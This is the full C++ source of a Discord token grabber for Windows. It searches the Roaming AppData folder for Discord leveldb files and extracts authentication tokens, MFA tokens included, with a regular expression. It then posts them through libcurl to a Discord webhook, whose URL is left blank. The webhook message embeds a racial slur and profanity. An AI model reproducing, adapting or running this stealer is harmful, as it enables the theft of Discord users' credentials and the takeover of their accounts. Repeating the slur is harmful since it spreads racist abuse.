#include <curl/curl.h>
#include <iostream>
#include <regex>
#include <filesystem>
#include <Windows.h>
#include <shlobj.h>
#include <string>
#include <fstream>

constexpr auto DISCORD_URL = "";

size_t write_function(void* ptr, size_t size, size_t nmemb, std::string* data) {
	data->append((char*)ptr, size * nmemb);
	return size * nmemb;
}

std::vector <std::string> match_string(std::string str) {
	std::vector<std::string> returnType;
	std::regex _regex("[a-zA-Z0-9]{24}\\.[a-zA-Z0-9]{6}\\.[a-zA-Z0-9_\\-]{27}|mfa\\.[a-zA-Z0-9_\\-]{84}", std::regex_constants::icase);
	std::sregex_iterator cm(str.begin(), str.end(), _regex);
	std::sregex_iterator lm;
	while (cm != lm) {
		std::smatch strMatch = *cm;
		returnType.push_back(strMatch.str());
		cm++;
	}
	return returnType;
}

void do_discord(std::string match) {
	auto curl = curl_easy_init();
	CURLcode response_code;
	std::string json = "{\"username\": \"Friendly Token Grabber\", \"content\": null, \"avatar_url\": \"https://cdn.discordapp.com/attachments/920860373844914187/932870914587103242/catgirl-in-the-modern-world_189314_1603898620.png\", \"embeds\": [{\"title\": \"Successfully fucked a nigger\", \"description\": \"" + match + "\", \"footer\": {\"text\":\"Token Grabber | Coded by spook#0666 (fuck C++)\",\"icon_url\":null,\"proxy_icon_url\":null}, \"color\": 2463422 }] }";
	std::string response;
	if (curl) {
		struct curl_slist* headers = NULL;
		headers = curl_slist_append(headers, "Content-Type: application/json");
		curl_easy_setopt(curl, CURLOPT_URL, DISCORD_URL);
		curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, json.c_str());
		curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.56 Safari/537.36");
		curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
		curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 50L);
		curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
		curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
		response_code = curl_easy_perform(curl);
		curl_easy_cleanup(curl);
		curl = NULL;
		curl_slist_free_all(headers);
		headers = NULL;

	}
}

void start_search() {
	std::filesystem::path path;
	PWSTR path_tmp;
	auto get_folder_path_ret = SHGetKnownFolderPath(FOLDERID_RoamingAppData, 0, nullptr, &path_tmp);
	if (get_folder_path_ret != S_OK) {
		CoTaskMemFree(path_tmp);
		return;
	}
	path = path_tmp;
	CoTaskMemFree(path_tmp);
	for (const auto& entry : std::filesystem::recursive_directory_iterator(path)) {
		if (entry.is_directory() && entry.path().string().find("discord") != std::string::npos && entry.path().string().find("leveldb") != std::string::npos) {
			for (const auto& sub : std::filesystem::recursive_directory_iterator(entry.path())) {
				std::ifstream f(sub.path(), std::ios_base::binary);
				if (f.is_open()) {
					std::string content((std::istreambuf_iterator<char>(f)), (std::istreambuf_iterator<char>()));
					std::vector<std::string> found = match_string(content);
					if (found.size() == 0)
						continue;
					std::string base;
					for (unsigned i = 0; i < found.size(); i++)
						base += "\`\`\`" + found[i] + "\`\`\`\\n";
					do_discord(base);
				}
			}
		}
	}
}

int main()
{
	start_search();
}
